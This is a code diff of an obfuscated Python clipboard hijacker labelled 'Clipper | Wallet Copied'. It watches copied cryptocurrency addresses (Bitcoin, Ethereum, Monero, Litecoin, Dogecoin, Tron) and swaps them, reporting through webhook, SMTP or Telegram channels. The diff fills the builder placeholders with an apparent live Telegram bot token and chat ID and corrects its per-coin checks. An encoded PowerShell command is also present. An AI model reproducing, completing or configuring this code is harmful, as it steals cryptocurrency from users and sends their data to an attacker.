@@ -17,12 +17,12 @@ import winreg as ef9uh77
 import threading as wefuh4323
 import asyncio as nueia8732q
 
-xwwwrew = '%Brgxer%'
-dsfrsdjk = '%Zrxgre%'
-dsvisdf = '%Brxger%'
+xwwwrew = 'y'
+dsfrsdjk = 'y'
+dsvisdf = 'y'
 
-yxuiue = '%Bxud%'
-deiuc = '%Hdhji%'
+yxuiue = 'y'
+deiuc = 'y'
 
 def esuih():
     try:
@@ -66,16 +66,16 @@ moon = 'powershell.exe -EncodedCommand RwBlAHQALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAd
 
 
 
-deswsjn = '%webhook%'
+deswsjn = 'None'
 
-kuhio49 = '%tele%'
-kuhioxx49 = '%chatid%'
+kuhio49 = '7301879312:AAEX-vmINjINVfNk4Qiu_n6gTW2TraMMtL0'
+kuhioxx49 = '5865520781'
 
-regh54 = '%smtp%'
+regh54 = 'None'
 
-dvxkioucb = '%pas%'
+dvxkioucb = 'None'
 
-fwefg54z54 = '%rec%'
+fwefg54z54 = 'None'
 
 r6zuj75654 = 'Clipper | Wallet Copied'
 
@@ -145,12 +145,12 @@ async def egreger453645(wadwa32, fexccxvxcew, ewsfuin8934, fweijf):
         pass
 
 
-hrextr_R2Xoy1 = '%BTC%'
-hrextr_R2Xoy2 = '%ETH%'
-hrextr_R2Xoy3 = '%MONERO%'
-hrextr_R2Xoy4 = '%LTC%'
-hrextr_R2Xoy5 = '%DOGE%'
-hrextr_R2Xoy6 = '%TRX%'
+hrextr_R2Xoy1 = 'BTC'
+hrextr_R2Xoy2 = 'None'
+hrextr_R2Xoy3 = 'None'
+hrextr_R2Xoy4 = 'None'
+hrextr_R2Xoy5 = 'None'
+hrextr_R2Xoy6 = 'None'
 
 
 
@@ -179,7 +179,7 @@ def vdsu281cjm():
 
     greduhio.sleep(0.25)
     if wadyhe_cery11 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy1 == 'None':
             return
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery1.group() != hrextr_R2Xoy1:
@@ -199,7 +199,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
 
     elif wadyhe_cery22 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy2 == 'None':
             return
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery2.group() != hrextr_R2Xoy2:
@@ -240,7 +240,7 @@ def vdsu281cjm():
                 wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()
 
     elif wadyhe_cery44 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy4 == 'None':
             return
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery4.group() != hrextr_R2Xoy4:
@@ -258,7 +258,7 @@ def vdsu281cjm():
 
 
     elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy5 == 'None':
             return
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery5 is not None or wadyhe_cery00 is not None or wadyhe_cery000 is not None:
@@ -305,7 +305,7 @@ def vdsu281cjm():
                 if regh54 != 'None':
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     elif wadyhe_cery66 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy6 == 'None':
             return
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery6.group() != hrextr_R2Xoy6:
